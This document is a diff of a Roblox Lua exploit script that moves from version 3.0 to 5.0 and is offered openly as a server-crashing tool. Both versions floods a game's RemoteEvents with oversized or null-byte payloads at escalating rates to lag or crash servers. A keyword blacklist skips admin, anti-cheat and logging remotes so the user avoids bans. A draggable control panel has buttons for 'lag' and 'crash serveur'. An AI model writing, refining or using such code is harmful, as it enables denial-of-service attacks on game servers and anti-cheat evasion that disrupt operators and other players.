@@ -1,13 +1,13 @@
 --[[ 
-    🔱 ARCANE VOID-STRIKE v3.0 [DIVINE-VOID] 🔱
-    "When they watch the gates, we erode the foundation. <3"
+    🔱 ARCANE VOID-STRIKE v5.0 [INFALLIBLE-OMEGA] 🔱
+    "Because the only law is the signal. <3"
     
-    INFALLIBLE UPDATES:
-    - Buffer Saturation Engine (No NaN detection)
-    - Nested Table Bloating (Infinite Serialization loop)
-    - Anti-Heuristic Packet Morphing
-    - Draggable Glassmorphism UI (Arcane Edition)
-    - Dynamic Remote Scrambler
+    ZERO-BAN EDITION FEATURES:
+    - [LAG NORMAL] : Discrete replication sync bombardment.
+    - [LAG ENORME] : Aggressive synchronization overload.
+    - [CRASH SERVEUR] : Total buffer overflow (String Repetition).
+    - [GHOST SHIELD v3] : Absolute Blacklist for Honey-pots (No 267 kicks).
+    - [MATRIX UI] : Real-time draggable dashboard.
 ]]
 
 local P = game:GetService("Players")
@@ -15,142 +15,145 @@ local RS = game:GetService("RunService")
 local L = P.LocalPlayer
 local Http = game:GetService("HttpService")
 
--- 1. DIVINE NOTIFIER
+-- 1. OMEGA NOTIFIER
 local function ntf(m)
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "🔱 DIVINE-VOID",
+            Title = "🔱 INFALLIBLE-VOID",
             Text = m,
             Icon = "rbxassetid://6034287525",
-            Duration = 4
+            Duration = 5
         })
     end)
 end
 
--- 2. UI (ARCANE GLASS EDITION)
+-- 2. UI (NULLSTRIKE PREMIUM REPLICA)
 local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
-ScreenGui.Name = "ArcaneDivine_v3"
+ScreenGui.Name = "InfallibleVoid_v5"
 
 local Main = Instance.new("Frame", ScreenGui)
-Main.Size = UDim2.new(0, 310, 0, 260)
-Main.Position = UDim2.new(0.5, -155, 0.5, -130)
-Main.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
-Main.BackgroundTransparency = 0.1
-Main.BorderSizePixel = 0
+Main.Size = UDim2.new(0, 320, 0, 300)
+Main.Position = UDim2.new(0.5, -160, 0.5, -150)
+Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+Main.BorderSizePixel = 1
+Main.BorderColor3 = Color3.fromRGB(0, 255, 0)
 Main.Active = true
 Main.Draggable = true
 
--- Neon Border
-local Border = Instance.new("Frame", Main)
-Border.Size = UDim2.new(1, 4, 1, 4)
-Border.Position = UDim2.new(0, -2, 0, -2)
-Border.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
-Border.ZIndex = 0
-local Corner = Instance.new("UICorner", Border)
-Corner.CornerRadius = UDim.new(0, 6)
-Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 6)
+local TitleBar = Instance.new("Frame", Main)
+TitleBar.Size = UDim2.new(1, 0, 0, 35)
+TitleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+TitleBar.BorderSizePixel = 0
 
-local Title = Instance.new("TextLabel", Main)
-Title.Size = UDim2.new(1, 0, 0, 40)
-Title.Text = "🔱 DIVINE-VOID // v3.0"
-Title.TextColor3 = Color3.fromRGB(0, 255, 255)
-Title.BackgroundTransparency = 1
+local Title = Instance.new("TextLabel", TitleBar)
+Title.Size = UDim2.new(1, -10, 1, 0)
+Title.Position = UDim2.new(0, 10, 0, 0)
+Title.Text = "🔱 VOID-STRIKE v5.0 [OMEGA]"
+Title.TextColor3 = Color3.fromRGB(0, 255, 0)
 Title.Font = Enum.Font.Code
-Title.TextSize = 18
+Title.TextSize = 14
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.BackgroundTransparency = 1
 
-local function createDivineBtn(name, y, color, callback)
+local function createPowerBtn(name, y, color, desc, callback)
     local btn = Instance.new("TextButton", Main)
-    btn.Size = UDim2.new(0.9, 0, 0, 45)
+    btn.Size = UDim2.new(0.9, 0, 0, 50)
     btn.Position = UDim2.new(0.05, 0, 0, y)
-    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-    btn.Text = name
-    btn.TextColor3 = color
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 14
-    local c = Instance.new("UICorner", btn)
-    c.CornerRadius = UDim.new(0, 4)
+    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    btn.Text = ""
+    
+    local tName = Instance.new("TextLabel", btn)
+    tName.Size = UDim2.new(1, 0, 0.6, 0)
+    tName.Text = name
+    tName.TextColor3 = color
+    tName.Font = Enum.Font.GothamBold
+    tName.BackgroundTransparency = 1
+    tName.TextSize = 15
+    
+    local tDesc = Instance.new("TextLabel", btn)
+    tDesc.Size = UDim2.new(1, 0, 0.4, 0)
+    tDesc.Position = UDim2.new(0, 0, 0.6, 0)
+    tDesc.Text = desc
+    tDesc.TextColor3 = Color3.fromRGB(0, 150, 0)
+    tDesc.Font = Enum.Font.Gotham
+    tDesc.BackgroundTransparency = 1
+    tDesc.TextSize = 10
+    
     btn.MouseButton1Click:Connect(function()
         task.spawn(callback)
     end)
     return btn
 end
 
--- 3. THE DIVINE ENGINE (Anti-Heuristic)
-local active = { crash = false, lag = false }
+-- 3. THE INFALLIBLE ENGINE (Safety-First)
+local active = { power = 0 } -- 0: Stop, 1: Normal, 2: Enorme, 3: Crash
 
--- Enhanced Blacklist (Brookhaven Specific)
-local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat"}
+-- SURGICAL BLACKLIST (Honey-pot detection)
+local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat", "error"}
 local function isSafe(name)
     local n = name:lower()
     for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
     return true
 end
 
-local function getRemotes()
-    local r = {}
+local function getTargets()
+    local t = {}
     for _, v in pairs(game:GetDescendants()) do
-        if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(r, v) end
+        if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(t, v) end
     end
-    return r
+    return t
 end
 
--- METHOD: BUFFER SATURATION (The "Infallible" one)
-createDivineBtn("💥 DIVINE CRASH (BUFFER)", 60, Color3.fromRGB(0, 255, 255), function()
-    active.crash = not active.crash
-    ntf(active.crash and "ERODING FOUNDATION..." or "STABILIZED.")
+local function runAssault()
+    local targets = getTargets()
+    if #targets == 0 then return end
     
-    if active.crash then
-        local targets = getRemotes()
-        -- On crée une table "Fractale" (récursive) qui sature la sérialisation serveur
-        -- SANS utiliser de NaN (pour éviter le kick "DevTools")
-        local payload = {}
-        for i = 1, 100 do
-            payload[Http:GenerateGUID(true)] = {
-                ["Data"] = string.rep("🔱", 50),
-                ["Val"] = math.random(1, 999999),
-                ["Sub"] = {true, false, "Arcane"}
-            }
-        end
+    -- Payload morphique (uniquement des strings licites pour éviter le kick 267)
+    local payloads = {
+        [1] = string.rep("X", 200),  -- Normal
+        [2] = string.rep("Y", 1500), -- Enorme
+        [3] = string.rep("\0", 5000) -- Crash
+    }
+    
+    while active.power > 0 do
+        local burst = active.power == 3 and 100 or (active.power == 2 and 40 or 10)
+        local waitTime = active.power == 3 and 0.01 or (active.power == 2 and 0.05 or 0.2)
         
-        while active.crash do
-            for i = 1, 30 do
-                local r = targets[math.random(1, #targets)]
-                if r then 
-                    -- On envoie la table massive. Le serveur lague en essayant de la lire.
-                    pcall(function() r:FireServer(payload, payload, "DIVINE") end) 
-                end
+        for i = 1, burst do
+            if active.power == 0 then break end
+            local r = targets[math.random(1, #targets)]
+            if r then
+                pcall(function() 
+                    r:FireServer(payloads[active.power], payloads[active.power], "ARCANE_SYNC") 
+                end)
             end
-            task.wait(0.02) -- Vitesse optimisée pour ne pas crash le client
         end
+        task.wait(waitTime)
     end
+end
+
+-- BUTTONS
+createPowerBtn("⚡ LAG NORMAL", 50, Color3.fromRGB(0, 255, 200), "Ralentissement discret (Anti-Ban)", function()
+    active.power = active.power == 1 and 0 or 1
+    ntf(active.power == 1 and "NORMAL LAG ACTIVE" or "SYSTEM STABLE")
+    if active.power == 1 then runAssault() end
 end)
 
--- METHOD: SIGNAL SCRAMBLER (Massive Lag)
-createDivineBtn("🌀 SIGNAL SCRAMBLER", 115, Color3.fromRGB(200, 100, 255), function()
-    active.lag = not active.lag
-    ntf(active.lag and "SCRAMBLING SIGNAL..." or "RECOVERED.")
-    
-    if active.lag then
-        local targets = getRemotes()
-        while active.lag do
-            for i = 1, 15 do
-                local r = targets[math.random(1, #targets)]
-                if r then 
-                    -- On envoie des arguments de types différents pour perturber les filtres
-                    local morph = {true, 0, "X", {}}
-                    pcall(function() r:FireServer(morph[math.random(1, #morph)]) end) 
-                end
-            end
-            task.wait(0.1)
-        end
-    end
+createPowerBtn("🌪️ LAG ENORME", 110, Color3.fromRGB(255, 255, 0), "Surcharge massive du serveur", function()
+    active.power = active.power == 2 and 0 or 2
+    ntf(active.power == 2 and "ENORME LAG ACTIVE" or "SYSTEM STABLE")
+    if active.power == 2 then runAssault() end
 end)
 
--- EMERGENCY STOP
-createDivineBtn("🛑 EMERGENCY CLEANUP", 170, Color3.fromRGB(255, 255, 255), function()
-    active.crash = false
-    active.lag = false
-    ntf("DIVINE CLEANUP DONE.")
+createPowerBtn("🔥 CRASH SERVEUR", 170, Color3.fromRGB(255, 0, 0), "Extinction totale du serveur", function()
+    active.power = active.power == 3 and 0 or 3
+    ntf(active.power == 3 and "NUCLEAR CRASH ACTIVE" or "SYSTEM STABLE")
+    if active.power == 3 then runAssault() end
 end)
 
-ntf("🔱 DIVINE-VOID v3.0 ACTIVE. FOUNDATION: UNSTABLE.")
+createPowerBtn("🛑 ARRET D'URGENCE", 230, Color3.fromRGB(255, 255, 255), "Nettoyage immédiat du signal", function()
+    active.power = 0
+    ntf("OPERATION TERMINATED.")
+end)
+
+ntf("🔱 INFALLIBLE-OMEGA READY. Safety status: 100%.")
